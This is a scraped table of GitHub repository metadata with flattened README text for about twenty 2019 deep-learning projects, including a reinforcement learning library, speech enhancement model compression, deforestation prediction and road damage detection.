osudrl,apex,n/a,Apex is a small modular library that contains some implementations of continuous reinforcement learning algorithms Fully compatible with OpenAI gym Running experiments Basics Any algorithm can be run from the apex py entry point To run DDPG on Walker2d v2 bash python apex py ddpg envname Walker2d v2 batchsize 64 Logging details Monitoring live training progress Tensorboard logging is enabled by default for all algorithms The logger expects that you supply an argument named logdir containing the root directory you want to store your logfiles in and an argument named seed which is used to seed the pseudorandom number generators A basic command line script illustrating this is bash python apex py ars logdir logs ars seed 1337 The resulting directory tree would look something like this logs ars experiments New Experiment Logdir ppo synctd3 ddpg Using tensorboard makes it easy to compare experiments and resume training later on To see live training progress Run tensorboard logdir logs port 8097 then navigate to http localhost 8097 in your browser Unit tests You can run the unit tests using pytest To Do Sphinx documentation and github wiki Make logger as robust and pythonic as possible Fix some hacks having to do with support for parallelism namely Vectorize Normalize and Monitor Improve Tune implementations of TD3 Notes Troubleshooting X module not found Make sure PYTHONPATH is configured Make sure you run examples from root directory Features Parallelism with Ray https github com ray project ray GAE https arxiv org abs 1506 02438 TD lambda estimators PPO https arxiv org abs 1707 06347 VPG with ratio objective and with log likelihood objective TD3 https arxiv org abs 1802 09477 DDPG https arxiv org abs 1509 02971 RDPG https arxiv org abs 1512 04455 ARS https arxiv org abs 1803 07055 Parameter Noise Exploration https arxiv org abs 1706 01905 for TD3 only Entropy based exploration bonus advantage centering observation normalization WIP To be implemented long term SAC https arxiv org abs 1801 01290 GPO https arxiv org abs 1711 01012 NAF https arxiv org abs 1603 00748 SVG https arxiv org abs 1510 09142 I2A https arxiv org abs 1707 06203 PGPE http ieeexplore ieee org document 5708821 reload true Value Distribution https arxiv org pdf 1707 06887 pdf Oracle methods e g GPS https arxiv org abs 1610 00529 CUDA support should be trivial but I don t have a GPU to test on currently Maybe implemented in future DXNN https arxiv org abs 1008 2412 ACER https arxiv org abs 1611 01224 and other off policy methods Model based methods Acknowledgements Thanks to ikostrikov s whose great implementations were used for debugging Also thanks to rll for rllab which inspired a lot of the high level interface and logging for this library and to OpenAI for the original PPO tensorflow implementation Thanks to sfujim for the clean implementations of TD3 and DDPG in PyTorch Thanks modestyachts for the easy to understand ARS implementation,2019-07-19T22:40:44Z,2019-12-02T20:06:59Z,Jupyter Notebook,osudrl,Organization,1,6,3,345,master,yeshg#p-morais#siekmanj#SrikarValluri#dylan-albertazzi,5,0,0,1,0,0,16
XiaTiancong,Deep-Reinforcement-Learning-for-IoT-Network-Dynamic-Clustering-in-Edge-Computing,n/a,Deep Reinforcement Learning for IoT Network Dynamic Clustering in Edge Computing,2019-07-15T13:23:06Z,2019-11-16T01:53:48Z,Python,XiaTiancong,User,0,6,2,40,master,XiaTiancong,1,0,0,0,0,0,0
WilliamYu1993,ICSE,n/a,About this work Most recent studies on deep learning based speech enhance ment SE focused on improving denoising performance However successful SE applications require striking a desirable balance between denoising performance and computational cost in real scenarios In this study we propose a novelparameter pruning PP technique which removes redundant channels in a neural network In addition a parameter quan tization PQ technique was applied to reduce the size of aneural network by representing weights with fewer clustercentroids Because the techniques are derived based on dif ferent concepts the PP and PQ can be integrated to provideeven more compact SE models The experimental resultsshow that the PP and PQ techniques produce a compactedSE model with a size of only 9 76 compared to that of the original model resulting in minor performance losses from 0 85 to 0 84 for STOI and from 2 55 to 2 52 for PESQ The promising results suggest that the PPand PQ techniques can be used in an SE system in devices with limited storage and computation resources PP PQ schematic PP We found high redundancies in the channels of the well trained FCN layers which provides similar latent information of a input testing speech Thus we define a threshold for sparsity to prune these redundant channels and the process is like the graph below image https github com WilliamYu1993 ICSE blob master images pruningoverall png as shown in c we used a soft pruning technique which retrains the model at some specific number of pruning rate This allows the channels adjuist its latent behavior better after pruning PQ The PQ process the making of code book is shown in the graph below image https github com WilliamYu1993 ICSE blob master images Kmeans png Integration of PP PQ The best setup of PP PQ combination which we proposes is shown in the graph below image https github com WilliamYu1993 ICSE blob master images process png Experimental Results The integration of these two approaches achieved 10 times model compression ratio with minor performance drop like PESQ image https github com WilliamYu1993 ICSE blob master images PESQPP 26PQ 26FQ png STOI image https github com WilliamYu1993 ICSE blob master images STOIPP 26PQ 26FQ png ICSE technical summary A Training Testing environment setup Conda 8 0 tensorflow gpu 1 4 0 Python 2 7 Keras 1 1 Nvidia GTX 1080Ti markdown How to use the TIMITFCNMSE py Get python 2 7 environment Install Keras 1 1 if you already have later version of Keras please reinstall this version Fill in the GPU that is being used default 0 for 1 GPU computation resource 1 for no CPU computation resource Fill in the paths of the data expected to train test with Command python TIMITFCNMSE py you will get the model used in this work This baseline model follows the settings in Fu et al s FCN B Baseline models Normally the FCN https github com JasonSWFu End to end waveform utterance enhancement learning curve of this model will be like the following graph image https github com WilliamYu1993 ICSE blob master images LearningcurveFCNNTIMITMSE png The model we used in the following experiments can be found here https github com WilliamYu1993 ICSE tree master Models C Dataset In this paper we used TIMIT dataset https drive google com drive folders 1ojewtLskFCr5Q264EPByPUt11uYKC8mL usp sharing as our training and testing corpus D Additional Experimental Results Denoising task on different datasets Data Set Method PESQ STOI CHiME 2 Noisy 1 95 0 60 CHiME 2 FCN 2 03 0 75 CHiME 2 PP PQ 8x compressed 2 01 0 74 MHINT Noisy 1 54 0 81 MHINT FCN 2 17 0 86 MHINT PP PQ 10x compressed 2 08 0 84 Denoising Dereverberation joint training testing Denoising Dereverberation Test image https github com WilliamYu1993 ICSE blob master images Denoise 26Dereverb PNG E Evaluation Metrics We adopt PESQ and STOI to evaluate the proposed ICSE The tools we used can be found here https github com WilliamYu1993 ICSE tree master Evaluation F Computational Cost The results show that the computation loads in terms of simulated cycles is reduced from 23 821 318 to 19 084 879 1 25 times and in terms of FLOPs is reduced from 0 6M FLOPs to 0 48M FLOPs per input size arbitrary length of a speech utterance The Results https github com WilliamYu1993 ICSE tree master modelcyclessimulation are computed by ARM software simualtion https github com ARM software SCALE Sim G Q A Q1 Explain Fig 4 PESQ up STOI down A1 The inconsistent trends of PESQ and STOI have been reported in many speech enhancement studies r1 1 r1 2 r1 3 r1 4 r1 5 Based on our experience we found that PESQ scores are more related to signal smoothness and STOI are more related to speech structures completeness Since the PP technique is performed to reduce the redundant components in the FCN model the enhanced speech become smoother thus increasing the PESQ scores while losing delicate speech structures thus reducing the STOI scores Due to the page limitation on the published paper we provide discussions here Q2 The sparsity thresholding 4 seems arbitrary without giving any motivation justification or reference Please provide at least one of them A2 This research simulates a real single channel SE where the distribution of speech samples has a zero mean and a particular standard deviation As a result the values of weights in irredundant convolutional channels are larger than the mean absolute values MAV in each filter On the other hand the values of weights in redundant channels are smaller than its corresponding MAV We analyzed all weights in each channels in a statistical manner and accordingly determined the threshold values and pruned out redundant channels based on the determined threshold value Additionally since this strategy was inspired by the reference of 17 C T Liu et al Computation performance optimization of convolutional neural networks with redundant kernel removal we have added the reference in the paragraph We estimates the redundancy based on the sparsity 17 of each channel in a filter,2019-08-02T16:11:05Z,2019-12-09T06:13:02Z,MATLAB,WilliamYu1993,User,1,6,3,125,master,WilliamYu1993,1,0,0,0,0,0,0
MathiasKraus,PredictiveMaintenance,n/a,PredictiveMaintenance Forecasting remaining useful life Interpretable deep learning approach via variational Bayesian inferences This model runs with the official PHM08 Challenge Data Set Please extract the datasets into data PHM08 The model was implemented using pyro 0 2 1,2019-07-09T09:30:42Z,2019-12-05T10:43:10Z,Python,MathiasKraus,User,0,6,3,3,master,MathiasKraus,1,0,0,1,1,0,0
ysh329,deep-learning-model-archtecture-design-advice,n/a,deep learning model archtecture design advice operator fusion batchnorm scale convolution batchnorm convolutiondepthwise batchnorm deconvolution batchnorm deconvolutiondepthwise batchnorm innerproduct batchnorm convolution relu convolutiondepthwise relu deconvolution relu deconvolutiondepthwise relu innerproduct relu eliminate noop operator innerproduct dropout flatten after global pooling prefer better operator replace convolution with innerproduct after global pooling Happy Lantern Festival Report and Code Kaggle https www kaggle com c datasciencebowl discussion 13166 69284 Reference model optimize Tencent ncnn Wiki https github com Tencent ncnn wiki model optimize,2019-07-31T16:09:05Z,2019-11-25T13:22:31Z,n/a,ysh329,User,2,6,0,3,master,ysh329,1,0,0,0,0,0,0
alialaradi,DeepGalerkinMethod,n/a,Implementation of the Deep Galerkin Method The code given here is a companion to the review paper Solving Nonlinear and High Dimensional Partial Differential Equations via Deep Learning by A Al Aradi A Correia D Naiff G Jardim and Y Saporito https arxiv org abs 1811 08782 and reproduces the plots found in this work Note the review paper is based on DGM A deep learning algorithm for solving partial differential equations by J Sirignano and K Spiliopoulos Journal of Computational Physics 2018 https arxiv org abs 1708 07469,2019-07-10T12:37:51Z,2019-12-09T21:36:25Z,Python,alialaradi,User,2,6,2,6,master,alialaradi,1,0,0,0,0,0,0
DS3Lab,forest-prediction,n/a,forest prediction Deep learning for deforestation classification and forecasting in satellite imagery https tinyurl com greenai pledge https github com daviddao green ai Overview In this repository we provide implementations for 1 Data scraping Tile services and Google Earth Engine 2 Forest prediction Semantic Segmentation 3 Video prediction Lee et al 2018 4 Image to image translation Isola et al 2017 Installation console git clone https github com DS3Lab forest prediction git cd forest prediction semanticsegmentation unet conda create name forest env python 3 7 install sh source activate forest env Running You can train the models for semantic segmentation by simply running console forest env cd semanticsegmentation unet forest env python train py c configpath d gpuid For multi GPU training set gpuid to a comma separated list of devices e g d 0 1 2 3 4 This will produce a file having the time in which the script was executed as the folder name It will be saved in the savedir value from the JSON file under trainer Under savedir it will create a log file where you can check Tensorboard and a model file where the model is going to be stored Testing You can test the models for semantic segmentation by running console forest env python simpletest py r modelsavedpath model pth d gpuid It will run the predictions and save the corresponding outputs in modelsavedpath To keep an order of the images set both batchsize and numworkers to 1 Configuration You can change the type of model used and its configuration by altering or creating a config json file Structure of config json The fields of the config file are self explanatory We explain the most important ones name indicates the name of the experiment It is the folder in which both the training logs and models are going to be stored ngpu for multi GPU training it is necessary to specify how many gpus it is going to use For instance if the user specifies d 0 1 in order to use both gpus ngpu needs to be set up to 2 If it is set up to 1 it will only use gpu 0 if it is set up to a number higher than 2 then it will yield an error arch it specifies the model that will be used for training testing purposes dataloadertrain and dataloaderval data loaders for training and validation purposes For testing only dataloaderval is used,2019-07-25T13:12:08Z,2019-12-05T10:32:04Z,Python,DS3Lab,Organization,1,6,0,47,master,lming24#daviddao#dependabot[bot],3,0,0,0,0,0,1
elegantcoin,Raspberry,n/a,Pyimagesearch Deeplearning Raspberry and Machinelearningmastery fire 1 pyimagesearch Remastered pyimagesearch 2019 PyImageSearch https www pyimagesearch com 2019 04 15 live video streaming over network with opencv and imagezmq https github com elegantcoin Raspberry blob master pyimagesearch jpg https github com elegantcoin Raspberry blob master Pyimagesearch md fire 2 Jason Brownlee machinelearningmastery https github com elegantcoin Raspberry blob master machinelearning png https github com elegantcoin Raspberry blob master Machinelearningmastery md fire 3 400 https github com elegantcoin Raspberry blob master E5 9B BE E7 89 87 111 png 400 https github com elegantcoin Raspberry blob master E5 9B BE E7 89 87 00README md https github com thibmaek awesome raspberry pi Announcement 1 Robots 2 3,2019-07-09T08:50:33Z,2019-12-10T01:48:10Z,n/a,elegantcoin,User,1,6,2,57,master,elegantcoin,1,0,0,0,0,0,0
penghu-cs,SDML,n/a,SDML Peng Hu Liangli Zhen Dezhong Peng Pei Liu Scalable deep multimodal learning for cross modal retrieval https dl acm org citation cfm doid 3331184 3331213 C International ACM SIGIR Conference on Research and Development in Information Retrieval SIGIR 2019 635 644 denotes equal contribution PyTorch Code Abstract Cross modal retrieval takes one type of data as the query to retrieve relevant data of another type Most of existing cross modal retrieval approaches were proposed to learn a common subspace in a joint manner where the data from all modalities have to be involved during the whole training process For these approaches the optimal parameters of different modality specific transformations are dependent on each other and the whole model has to be retrained when handling samples from new modalities In this paper we present a novel cross modal retrieval method called Scalable Deep Multimodal Learning SDML It proposes to predefine a common subspace in which the between class variation is maximized while the within class variation is minimized Then it trains m modality specific networks for m modalities one network for each modality to transform the multimodal data into the predefined common subspace to achieve multimodal learning Unlike many of the existing methods our method can train different modality specific networks independently and thus be scalable to the number of modalities To the best of our knowledge the proposed SDML could be one of the first works to independently project data of an unfixed number of modalities into a predefined common subspace Comprehensive experimental results on four widely used benchmark datasets demonstrate that the proposed method is effective and efficient in multimodal learning and outperforms the state of the art methods in cross modal retrieval Framework The general framework of the proposed SDML method The m modality specific neural networks one network for each modality can be trained separately since they do not share any trainable parameters MAN framework png Results Performance comparison in terms of mAP scores on the PKU XMedia dataset Result pascalsentenceresults png Performance comparison in terms of mAP scores on the PKU XMedia dataset Performance comparison in terms of mAP scores on the Wikipedia dataset Result Wikipedia png Performance comparison in terms of mAP scores on the Wikipedia dataset Performance comparison in terms of mAP scores on the MS COCO dataset Result MSCOCO png Performance comparison in terms of mAP scores on the MS COCO dataset Citing SDML If you find SDML useful in your research please consider citing inproceedingshu2019deep author Hu Peng and Zhen Liangli and Peng Dezhong and Liu Pei title Scalable Deep Multimodal Learning for Cross Modal Retrieval booktitle Proceedings of the 42Nd International ACM SIGIR Conference on Research and Development in Information Retrieval series SIGIR 19 year 2019 isbn 978 1 4503 6172 9 location Paris France pages 635 644 numpages 10 url http doi acm org 10 1145 3331184 3331213 doi 10 1145 3331184 3331213 acmid 3331213 publisher ACM address New York NY USA keywords cross modal retrieval multimodal learning representation learning,2019-07-17T09:40:21Z,2019-10-17T08:01:05Z,Python,penghu-cs,User,1,6,1,13,master,penghu-cs,1,0,0,0,0,0,0
odundar,face-detection-python,n/a,Python AI Project with Intel R OpenVINO TM Inference Engine Python API Here is a template project to reuse for production ready applications to use Deep Learning models focusing on Face Age Gender detection models At this stage only OpenVINO has been integrated OpenVINO TM Toolkit Installation and Configuration for Ubuntu 18 04 OpenVINO TM Version 2019 2 242 You can install OpenVINO TM by following the instructions published online documentation https docs openvinotoolkit org https docs openvinotoolkit org latest docsinstallguidesinstallingopenvinolinux html Before running this Python application 1 Set Environment Variables on the current workspace bash source opt intel openvino bin setupvars sh OR 2 Set Environment Variables System Wide Copy files intel openvino sh files intel openvino conf file as shown below bash sudo cp files intel openvino sh etc profile d sudo cp files intel openvino conf etc ld so conf d sudo reboot Clone This Repository bash git clone https github com odundar facedetection git Quick Run for Face Detection Application If all setup completed successfully you can use the default configurations to give a start for face detection application bash python3 facedetectionopenvino py config config json app app folder includes apps ready to run for face age gender detection applications services service modules stored here which are to be deployed in docker microservices config config folder includes app and service default configurations to be used as template detection detection folder contains the modules and classes to reuse for inference application development detection detectionbaseov py InferenceConfig InferenceBase agegenderdetectionov py AgeGenderDetectionTypes AgeGenderDetection AgeGenderConfig MTCNNAgeGenderDetection MTCNNAgeGenderConfig facedetectionov py FaceDetectionModelTypes FaceDetectionConfig OpenMZooFaceDetection MTCNNFaceDetectionConfig MtCNNFaceDetection docker Includes instructions to deploy face age gender detection services as docker services files This folder includes system configuration files for OpenVINO TM Toolkit models Folder includes instructions how to fetch models convert and use them,2019-07-24T16:48:39Z,2019-12-13T01:58:47Z,Python,odundar,User,0,6,1,11,master,odundar,1,0,0,1,0,0,0
javadnoorb,HistCNN,n/a,This package is an implementation of Inception v3 CNN to classify TCGA H E whole slide images WSI according to tumor normal status and cancer subtype It implements a pipeline in Kubernetes k8s under Google Cloud Platform GCP for labeling tiling and transfer learning on the images schematic of the analysis pipeline schematic png For details please see the manuscript preprint Javad Noorbakhsh Saman Farahmand Mohammad Soltanieh ha Sandeep Namburi Kourosh Zarringhalam Jeff Chuang Pan cancer classifications of tumor histological images using deep learning bioRxiv 715656 https doi org 10 1101 715656 Installation To properly use the pipelines you will need to install the package After changing current directory to the root of the project run for now this only works in the development mode bash pip install e Documentation The Kubernetes pipelines are separated into individual apps which run the corresponding problem of interest on GCP For details on each app refer to the README in its corresponding folder The following apps are implemented k8s app tile k8s k8s app tile tile whole slide images k8s app createcaches k8s k8s app createcaches apply a forward pass of tiles through pretraind CNN and store the last layer values as a text file hereafter called cache k8s app cache tfrecords tn k8s k8s app cache tfrecords tn create tfrecords from caches for tumor normal classification k8s app cache tfrecords subtype k8s k8s app cache tfrecords subtype create tfrecords from caches for subtype classification k8s app runcnn tn k8s k8s app runcnn tn run CNN for tumor normal classification k8s app runcnn subtype k8s k8s app runcnn subtype run CNN for subtype classification k8s app runcnn tn crossclassify k8s k8s app runcnn tn crossclassify test the CNNs trained on tumor normal status for cross classification To begin using any of these apps you will need to set up a k8s cluster k8s README md Command line tool Few functionalities have been implemented through a command line tool To access its help run bash histcnn help or one of the more detailed alternatives bash histcnn gcs help histcnn annotate help histcnn run subtype help,2019-07-25T18:26:06Z,2019-12-12T12:44:33Z,Python,javadnoorb,User,2,6,0,30,master,javadnoorb,1,0,0,2,0,0,1
madhugopinathan,deep-nlu,chatbot#deep-learning#deep-neural-networks#natural-language-processing#natural-language-understanding#transfer-learning#transformer,,2019-08-03T04:58:23Z,2019-12-07T11:00:53Z,Jupyter Notebook,madhugopinathan,User,3,5,3,21,master,madhugopinathan,1,0,0,0,0,0,0
rajatkb,Practical-Deep-Learning,n/a,Practical Deep Learning Tensorflow All Around Guwahati Royal Global University Something new https docs google com presentation d 1vrs Cm8QOfLiAaGg3x6Dl2k8ZhRUVsIcXaVQ3z5xo edit usp sharing Repository for the TF All Around Guwahati Royal Global University Guwahati Assam TF 1 demo https colab research google com drive 1D4sTHUi3okv6bTFmqh4 ioCoAw aIu6z TF 2 demo https colab research google com drive 14gkmSP7cjqcHemeX5P 6eymv EXpH99v TF3 demo https colab research google com drive 1M PqiEDl8HmOM6K3XkGOMnZvBvYI6ubt TF 4 demo https colab research google com drive 1M PqiEDl8HmOM6K3XkGOMnZvBvYI6ubt Keras API demo https colab research google com drive 1Oo3XftRyt4cqQHLSrmcvOgkaQmouGh Keras API U net segmentation demo https colab research google com drive 134LTsLFO73E9ym8SiOoGi60oqFQX1vhP Keras API Prisma demo https colab research google com drive 1ShTCQopQJD0ctny7E42Mvx943d61ws5f TequipIII Faculty Workshop on Machine Learning Python Assam Engineering College Reposit1ory for links and everything else used for presentation of Deep Learning frameworks and use cases at Assam Engineering College s Computer Science Department faculty workshop of Python and Machine Learning Pytorch Autograd demo demo https colab research google com drive 1NY2Nsffj794xPdSYxbXOxmVhbFbvx32b Pytorch more revision demo https colab research google com drive 1lUmkokqmQdWheNMfzEM0IdvtdIiU9N0L Keras fashion mnist demo https colab research google com drive 1Oo3XftRyt4cqQHLSrmcvOgkaQmouGh Tensorflow tutorial 1 demo https colab research google com drive 14gkmSP7cjqcHemeX5P 6eymv EXpH99v scrollTo YtLedulrBdEU Tensorflow tutorial 2 demo https colab research google com drive 1M PqiEDl8HmOM6K3XkGOMnZvBvYI6ubt scrollTo 0wUjhiIn2JWK Oxford 101 flower dataset classification using transfer learning demo https colab research google com drive 1YJFRyKGDwo4G8kUoYluuRyaub0DIOnTH U net segmentation task notebook demo https colab research google com drive 134LTsLFO73E9ym8SiOoGi60oqFQX1vhP GANs tryout demo demo https colab research google com drive 1c71wdjQC qVImgf 9e9rLpLwMk18Oq7,2019-07-30T05:22:11Z,2019-09-18T09:43:06Z,n/a,rajatkb,User,1,5,2,8,master,rajatkb,1,0,0,0,0,0,0
rldnjs3258,Deep_learning_zero_to_all-PyTorch,n/a,Deeplearningzerotoall PyTorch 1 README Repository 2 PyTorch Repository SAI SummerStudy This repository includes theories studies and codes about Deep learning zero to all PyTorch Original Address https deeplearningzerotoall github io season2 lecpytorch html 2 Contents PART 1 Machine Learning PyTorch Basic Lab 01 1 Tensor Manipulation 1 Lab 01 2 Tensor Manipulation 2 Lab 02 Linear regression Lab 03 Deeper Look at GD Lab 04 1 Multivariable Linear regression Lab 04 2 Loading Data Lab 05 Logistic Regression Lab 06 Softmax Classification Lab 07 1 Tips Lab 07 2 MNIST Introduction PART 2 Neural Network Lab 08 1 Perceptron Lab 08 2 Multi Layer Perceptron Lab 09 1 ReLU Lab 09 2 Weight initialization Lab 09 3 Dropout Lab 09 4 Batch Normalization PART 3 Convolutional Neural Network Lab 10 0 Convolution Neural Networkintro Lab 10 1 Convolution Lab 10 2 mnist cnn Lab 10 3 visdom Lab 10 4 1 ImageFolder1 Lab 10 4 2 ImageFolder2 Lab 10 5 Advance CNN VGG Lab 10 6 1 Advanced CNN RESNET 1 Lab 10 6 2 Advanced CNN RESNET 2 Lab 10 7 Next step of CNN PART 4 Recurrent Neural Network Lab 11 0 RNN intro Lab 11 1 RNN basics Lab 11 2 RNN hihello and charseq Lab 11 3 Long sequence Lab 11 4 RNN timeseries Lab 11 5 RNN seq2seq Lab 11 6 PackedSequence 3 Learn More AWS https www youtube com watch v 9VckXVoJEe0 feature youtu be Google Cloud ML https www youtube com watch v 8Jkz2HexDAM feature youtu be Google Colaboratory https www youtube com watch v XRBXMohjQos,2019-06-28T10:51:03Z,2019-08-20T05:34:43Z,n/a,rldnjs3258,User,0,5,2,60,master,rldnjs3258,1,0,0,0,0,0,0
ertkrn,RoadDamageDetection-DeepLearning,n/a,RoadDamageDetection DeepLearning It is intended to detect damage to road images taken by a camera For this deep learning technology a subspace of machine learning and Convolutional Neural Networks CNN one of the most popular types of deep neural networks are used The TensorFlow library is trained through the Ssd Inception V2 Coco pre trained model to detect damage to images As a result of the tests and trainings the closest determinations are 86 In order to increase the accuracy of the training the use of GPU the magnification of the data set and the number of iterations were considered Stages Of The Project Project Architect Creating a DataSet Creating LabelMap Creating a TensorFlow Records File Training Pipeline Configuration Software and Features Required for Training Training Process Using TensorBoard for Visualization Comparison of Different Models Project Architect Project Architect https user images githubusercontent com 37222672 63251659 d65f2580 c276 11e9 848e c4b71d450c17 png Creating a DataSet Please pay attention to the disk capacity when downloading trainedModels 70MB https s3 ap northeast 1 amazonaws com mycityreport trainedModels tar gz RoadDamageDatasetv1 1 7GB https s3 ap northeast 1 amazonaws com mycityreport RoadDamageDataset tar gz Creating LabelMap LabelMap https user images githubusercontent com 37222672 63252127 ee837480 c277 11e9 8329 52a0b9df6bfa png Xml Output of Tagged Image Xml https user images githubusercontent com 37222672 63252589 c0eafb00 c278 11e9 992d 7dfca1f9e26c png Creating a TensorFlow Records File TFRecords https user images githubusercontent com 37222672 63253112 e593a280 c279 11e9 9dda 256f4575dc8b png After the tagging of the images to be used for the Train and Test stages TFRecords which serve as input data to the TensorFlow training model are created The TFRecord format is a simple format for storing a series of binary records Protocol buffers are a cross platform interlingual library for efficient serialization of structured data Training Pipeline Configuration The Following Config file must edit root path SSD with Inception v2 configuration for MSCOCO Dataset Users should configure the finetunecheckpoint field in the train config as well as the labelmappath and inputpath fields in the traininputreader and evalinputreader Search for PATHTOBECONFIGURED to find the fields that should be configured model ssd numclasses 8 Set this to the number of different label classes boxcoder fasterrcnnboxcoder yscale 10 0 xscale 10 0 heightscale 5 0 widthscale 5 0 matcher argmaxmatcher matchedthreshold 0 5 unmatchedthreshold 0 5 ignorethresholds false negativeslowerthanunmatched true forcematchforeachrow true similaritycalculator iousimilarity anchorgenerator ssdanchorgenerator numlayers 6 minscale 0 2 maxscale 0 95 aspectratios 1 0 aspectratios 2 0 aspectratios 0 5 aspectratios 3 0 aspectratios 0 3333 reduceboxesinlowestlayer true imageresizer fixedshaperesizer height 300 width 300 boxpredictor convolutionalboxpredictor mindepth 0 maxdepth 0 numlayersbeforepredictor 0 usedropout false dropoutkeepprobability 0 8 kernelsize 3 boxcodesize 4 applysigmoidtoscores false convhyperparams activation RELU6 regularizer l2regularizer weight 0 00004 initializer truncatednormalinitializer stddev 0 03 mean 0 0 featureextractor type ssdinceptionv2 Set to the name of your chosen pre trained model mindepth 16 depthmultiplier 1 0 convhyperparams activation RELU6 regularizer l2regularizer weight 0 00004 initializer truncatednormalinitializer stddev 0 03 mean 0 0 batchnorm train true scale true center true decay 0 9997 epsilon 0 001 overridebasefeatureextractorhyperparams true loss classificationloss weightedsigmoid localizationloss weightedsmoothl1 hardexampleminer numhardexamples 3000 iouthreshold 0 99 losstype CLASSIFICATION maxnegativesperpositive 3 minnegativesperimage 0 classificationweight 1 0 localizationweight 1 0 normalizelossbynummatches true postprocessing batchnonmaxsuppression scorethreshold 1e 8 iouthreshold 0 6 maxdetectionsperclass 100 maxtotaldetections 100 scoreconverter SIGMOID trainconfig batchsize 12 Increase Decrease this value depending on the available memory Higher values require more memory and vice versa optimizer rmspropoptimizer learningrate exponentialdecaylearningrate initiallearningrate 0 004 decaysteps 800720 decayfactor 0 95 momentumoptimizervalue 0 9 decay 0 9 epsilon 1 0 finetunecheckpoint Enter the root path Tensorflow workspace trainingdemo pre trained model model ckpt Path to extracted files of pre trained model fromdetectioncheckpoint true Note The below line limits the training process to 200K steps which we empirically found to be sufficient enough to train the pets dataset This effectively bypasses the learning rate schedule the learning rate will never decay Remove the below line to train indefinitely numsteps 200000 dataaugmentationoptions randomhorizontalflip dataaugmentationoptions ssdrandomcrop traininputreader tfrecordinputreader inputpath Enter the root path Tensorflow workspace trainingdemo annotations train record Path to training TFRecord file labelmappath Enter the root path Tensorflow workspace trainingdemo annotations labelmap pbtxt Path to label map file evalconfig numexamples 8000 Note The below line limits the evaluation process to 10 evaluations Remove the below line to evaluate indefinitely maxevals 10 evalinputreader tfrecordinputreader inputpath Enter the root path Tensorflow workspace trainingdemo annotations test record Path to testing TFRecord labelmappath Enter the root path Tensorflow workspace trainingdemo annotations labelmap pbtxt Path to label map file shuffle false numreaders 1 Software and Features Required for Training Required https user images githubusercontent com 37222672 63254315 34dad280 c27c 11e9 802d db3da484de88 png Training Process Execute on Python Command Line the following code Training1 https user images githubusercontent com 37222672 63254379 53d96480 c27c 11e9 8053 c881f42ec132 png The result will look like this Training2 https user images githubusercontent com 37222672 63254399 5a67dc00 c27c 11e9 96af aaa5f080db78 png Using TensorBoard for Visualization TensorBoard https user images githubusercontent com 37222672 63254616 b6cafb80 c27c 11e9 82ad 25c27ffc713f png Test Result Test1 https user images githubusercontent com 37222672 63254711 e37f1300 c27c 11e9 90e5 d04e9ef0f877 png Test2 https user images githubusercontent com 37222672 63254734 f0036b80 c27c 11e9 98f5 3d5cbe073625 png Test3 https user images githubusercontent com 37222672 63254748 f691e300 c27c 11e9 984e 576263fdaf36 png PROJECT END If you have any problems please contact me via the links LinkedIn Erturul Kuran https www linkedin com in ertkrn Email Address ertkrn hotmail com,2019-07-25T08:43:45Z,2019-12-06T12:24:18Z,Python,ertkrn,User,0,5,0,3,master,ertkrn,1,0,0,0,1,0,0
PacktPublishing,Master-Deep-Learning-with-TensorFlow-2.0-in-Python-2019,n/a,Master Deep Learning with TensorFlow 2 0 in Python 2019 Master Deep Learning with TensorFlow 2 0 in Python 2019,2019-07-17T14:25:27Z,2019-10-25T13:22:04Z,n/a,PacktPublishing,Organization,1,5,4,2,master,Asif-packt,1,0,0,0,0,0,0
Sherryuu,CTR-of-deep-learning,n/a,CTR of deep learning A tensorflow implementation of a series of deep learning methods to predict CTR including FM FNN NFM Attention based NFM Attention based MLP Inner PNN Out PNN CCPM,2019-07-29T03:06:48Z,2019-10-12T04:05:26Z,Python,Sherryuu,User,1,5,0,5,master,Sherryuu,1,0,0,0,0,0,0
Bribak,DeepConnection,n/a,DeepConnection Deep learning model to classify relationship state in romantic couples from images and video This repository contains the code for training and using the deep learning binary classification model DeepConnection described in DeepConnection Classifying Relationship State from Images of Romantic Couples by Maximiliane Uhlich and Daniel Bojar https psyarxiv com df25j Capitalizing on image data of romantic couples DeepConnection uses facial and bodily expressions to predict the relationship state of the couple This leads to a classification accuracy of nearly 97 DeepConnection consists of a pretrained ResNet 34 base model with a subsequent spatial pyramid pooling layer https arxiv org abs 1406 4729 with spatial bins of 8x8 4x4 2x2 and 1x1 and a power mean transformation http lamda nju edu cn zhangcl papers pm2018pr pdf Subsequent to this a fully connected part with dropout and ReLU activation layers leads to the binary prediction The motivation for DeepConnection stems from an improved classification accuracy a substantial increase in classification speed in comparison to manual coding schemes and potentially new insights into relevant factors for relationship state in romantic couples The repository contains a Jupyter notebook with the relevant code for training using the models Additionally representative trained models from the three stages discussed in the paper can be downloaded here https ln sync com dl 04bec39c0 n8bei4rk 7kqhfkdz u8vkgfkn 4kghsrpx as pickle files,2019-06-30T12:24:50Z,2019-10-11T11:53:04Z,Jupyter Notebook,Bribak,User,0,5,1,5,master,Bribak,1,0,0,0,0,0,0
srihari-humbarwadi,deep_metric_learning_tf2.0,keras-tensorflow#metric-learning#similarity-search#triplet-loss,deepmetriclearningtf2 0 A tensorflow2 0 implementation of triplet loss with online hard mining strategy,2019-07-04T11:15:44Z,2019-11-07T09:30:29Z,Jupyter Notebook,srihari-humbarwadi,User,0,5,0,4,master,srihari-humbarwadi,1,0,0,0,0,0,0
ZichenTian,DL_accelerate_review,n/a,Winograd CPUGPU https zhuanlan zhihu com c1064124187198705664 github https github com ZichenTian DLacceleratereview https github com ZichenTian DLacceleratereview docs png,2019-08-05T05:06:52Z,2019-12-12T02:31:28Z,n/a,ZichenTian,User,2,5,0,0,master,,0,0,0,0,0,0,0
